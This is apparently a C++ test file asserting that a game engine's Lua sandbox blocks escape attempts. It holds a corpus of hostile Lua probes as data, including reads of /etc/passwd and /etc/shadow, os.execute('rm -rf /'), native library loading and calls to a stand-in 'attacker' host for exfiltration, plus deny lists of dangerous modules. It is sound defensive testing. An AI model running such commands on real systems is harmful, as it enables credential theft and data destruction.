// Lua sandbox negative-escape corpus. The manifest assertions pin the declared API,
// while the live interpreter assertions below prove that standard libraries, dynamic
// loading, process execution, and nondeterministic random access remain unavailable.
//
// Registered into frontier_gates_test (mirrors lua_api_manifest_gate_test.cpp).
#include "gtest/gtest.h"

#include "scripting/LuaApiManifest.h"
#include "scripting/LuaState.h"

#include <string>
#include <vector>

namespace {

using Luminumbra::scripting::GetLuaApiManifest;
using Luminumbra::scripting::LuaApiManifest;
using Luminumbra::scripting::LuaApiManifestMeetsBaseline;
using Luminumbra::scripting::LuaState;
using Luminumbra::scripting::SerializeLuaApiManifestJson;

bool ManifestExposes(const LuaApiManifest& manifest,
                     const std::string& module,
                     const std::string& name) {
    for (const auto& entry : manifest.entries) {
        if (entry.module == module && entry.name == name) {
            return true;
        }
    }
    return false;
}

bool ManifestExposesModule(const LuaApiManifest& manifest, const std::string& module) {
    for (const auto& entry : manifest.entries) {
        if (entry.module == module) {
            return true;
        }
    }
    return false;
}

// One adversarial probe: the {module, name} an escaping script would call, plus a
// human-readable escape class and executable Lua body.
struct EscapeCase {
    const char* escape_class;
    const char* module;
    const char* name;
    const char* attempt;
};

// The escape corpus: every vector a sandbox MUST deny. Grouped by class so a
// failure names the breach (filesystem read/write, process exec, dynamic code
// loading, raw global-table reach, reflection/debug, network, os/time tampering).
const std::vector<EscapeCase>& EscapeCorpus() {
    static const std::vector<EscapeCase> corpus = {
        // --- filesystem: read/write/iterate outside the world API ---
        {"filesystem", "io", "open", "io.open('/etc/passwd', 'r')"},
        {"filesystem", "io", "lines", "for l in io.lines('secret.txt') do end"},
        {"filesystem", "io", "popen", "io.popen('cat /etc/shadow')"},
        {"filesystem", "os", "remove", "os.remove('save.dat')"},
        {"filesystem", "os", "rename", "os.rename('a', 'b')"},
        {"filesystem", "os", "tmpname", "os.tmpname()"},
        // --- process / shell execution ---
        {"process", "os", "execute", "os.execute('rm -rf /')"},
        {"process", "os", "exit", "os.exit(1)"},
        {"process", "os", "getenv", "os.getenv('HOME')"},
        // --- dynamic code loading (bytecode / arbitrary chunk injection) ---
        {"code_loading", "_G", "load", "load('return os.execute')()"},
        {"code_loading", "_G", "loadstring", "loadstring('os.execute(\"id\")')()"},
        {"code_loading", "_G", "loadfile", "loadfile('payload.lua')()"},
        {"code_loading", "_G", "dofile", "dofile('payload.lua')"},
        {"code_loading", "package", "loadlib", "package.loadlib('evil.so', 'entry')"},
        {"code_loading", "package", "require", "require('socket')"},
        // --- raw global-table reach (escape the sandboxed environment) ---
        {"global_reach", "_G", "_G", "_G.os.execute('id')"},
        {"global_reach", "_G", "_ENV", "_ENV.io.open('x')"},
        {"global_reach", "_G", "rawget", "rawget(_G, 'os').execute('id')"},
        {"global_reach", "_G", "rawset", "rawset(_G, 'sandboxed', false)"},
        {"global_reach", "_G", "setmetatable", "setmetatable(_G, {})"},
        {"global_reach", "_G", "getmetatable", "getmetatable('').__index = nil"},
        {"global_reach", "_G", "collectgarbage", "collectgarbage('collect')"},
        // --- reflection / debug library (read stack, patch upvalues, hook) ---
        {"reflection", "debug", "getinfo", "debug.getinfo(1)"},
        {"reflection", "debug", "getupvalue", "debug.getupvalue(f, 1)"},
        {"reflection", "debug", "setupvalue", "debug.setupvalue(f, 1, evil)"},
        {"reflection", "debug", "sethook", "debug.sethook(spy)"},
        {"reflection", "debug", "getregistry", "debug.getregistry()"},
        // --- network ---
        {"network", "socket", "connect", "socket.connect('attacker', 1337)"},
        {"network", "http", "request", "http.request('http://attacker/exfil')"},
        // --- os/time tampering (break determinism via wall clock) ---
        {"nondeterminism", "os", "time", "os.time()"},
        {"nondeterminism", "os", "clock", "os.clock()"},
        {"nondeterminism", "math", "random", "math.random()"},
    };
    return corpus;
}

} // namespace

// The manifest must meet its baseline before we can trust the negative corpus
// (a malformed manifest could vacuously "not expose" anything).
TEST(LuaSandboxEscape, ManifestMeetsBaselineBeforeNegativeCorpus) {
    const LuaApiManifest& manifest = GetLuaApiManifest();
    EXPECT_TRUE(LuaApiManifestMeetsBaseline(manifest))
        << "manifest must satisfy its baseline contract before the escape corpus is meaningful";
}

// Core assertion: NO escape-shaped {module, name} appears in the whitelist. This is
// the contract that graduates to live pcall-deny tests when an interpreter exists.
TEST(LuaSandboxEscape, NoEscapeVectorIsExposedByTheManifest) {
    const LuaApiManifest& manifest = GetLuaApiManifest();
    for (const EscapeCase& c : EscapeCorpus()) {
        EXPECT_FALSE(ManifestExposes(manifest, c.module, c.name))
            << "SANDBOX ESCAPE SURFACE EXPOSED [" << c.escape_class << "]: the manifest whitelists "
            << c.module << "." << c.name << " -- a live interpreter would let a script run `"
            << c.attempt << "`. Remove it from GetLuaApiManifest().";
    }
}

TEST(LuaSandboxEscape, LiveInterpreterRejectsEscapeCorpus) {
    LuaState lua;
    for (const EscapeCase& c : EscapeCorpus()) {
        double value = 123.0;
        EXPECT_FALSE(lua.EvalNumber(c.attempt, value))
            << "live sandbox executed escape probe [" << c.escape_class << "]: " << c.attempt;
        EXPECT_DOUBLE_EQ(value, 123.0) << "failed evaluation must not modify its output";
    }
}

TEST(LuaSandboxEscape, LiveInterpreterStillExecutesTheSafeBinding) {
    LuaState lua;
    double value = -1.0;
    ASSERT_TRUE(lua.EvalNumber("return world.sample_energy_field(0, 0, 0)", value));
    EXPECT_DOUBLE_EQ(value, 0.0);
}

// Whole escape-bearing modules must be absent entirely (io/os/debug/package/socket/
// http). The intended surface is only core/entity/simulation/time/world.
TEST(LuaSandboxEscape, NoDangerousModuleIsExposedByTheManifest) {
    const LuaApiManifest& manifest = GetLuaApiManifest();
    for (const char* dangerous :
         {"io", "os", "debug", "package", "socket", "http", "ffi", "_G", "_ENV"}) {
        EXPECT_FALSE(ManifestExposesModule(manifest, dangerous))
            << "dangerous module '" << dangerous << "' is present in the script API manifest";
    }
}

// Positive control: the intended surface IS present, so the negative corpus is not
// passing merely because the manifest is empty.
TEST(LuaSandboxEscape, IntendedSurfaceIsStillPresent) {
    const LuaApiManifest& manifest = GetLuaApiManifest();
    EXPECT_TRUE(ManifestExposes(manifest, "core", "log"));
    EXPECT_TRUE(ManifestExposes(manifest, "world", "set_block"));
    EXPECT_TRUE(ManifestExposes(manifest, "entity", "spawn"));
    EXPECT_TRUE(ManifestExposes(manifest, "simulation", "emit_event"));
}

// Every exposed module belongs to the intended whitelist set. This catches a NEW
// module being added that is neither obviously-dangerous (caught above) nor intended
// -- the strongest form of the surface contract.
TEST(LuaSandboxEscape, EveryExposedModuleIsOnTheIntendedWhitelist) {
    const LuaApiManifest& manifest = GetLuaApiManifest();
    const std::vector<std::string> intended = {"core", "entity", "simulation", "time", "world"};
    for (const auto& entry : manifest.entries) {
        bool ok = false;
        for (const std::string& allowed : intended) {
            if (entry.module == allowed) {
                ok = true;
                break;
            }
        }
        EXPECT_TRUE(ok)
            << "manifest exposes unexpected module '" << entry.module << "." << entry.name
            << "' that is not on the intended whitelist {core,entity,simulation,time,world}";
    }
}

// The serialized manifest JSON must not contain escape-vector substrings. A
// belt-and-suspenders check against an escape name slipping in via a description /
// signature string rather than a {module,name} pair.
TEST(LuaSandboxEscape, SerializedManifestCarriesNoEscapeTokens) {
    const std::string json = SerializeLuaApiManifestJson(GetLuaApiManifest());
    for (const char* token : {
             "\"name\": \"execute\"",
             "\"name\": \"popen\"",
             "\"name\": \"loadstring\"",
             "\"name\": \"loadlib\"",
             "\"module\": \"io\"",
             "\"module\": \"os\"",
             "\"module\": \"debug\"",
             "\"module\": \"package\"",
         }) {
        EXPECT_EQ(json.find(token), std::string::npos)
            << "serialized manifest contains escape token: " << token;
    }
}
